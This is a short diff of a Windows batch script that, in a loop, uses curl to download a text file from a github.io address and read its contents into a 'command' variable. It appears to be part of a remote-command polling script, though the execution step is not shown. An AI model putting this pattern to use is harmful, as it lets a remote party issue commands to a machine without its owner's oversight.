@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :loop
-curl -s "samjoel2007.github.io/Operation_Strings/sam/sam.txt" > temp_cmd.txt
+curl -s "https://samjoel2007.github.io/Operation_Strings/sam/sam.txt" > temp_cmd.txt
 
 set /p command=<temp_cmd.txt
 
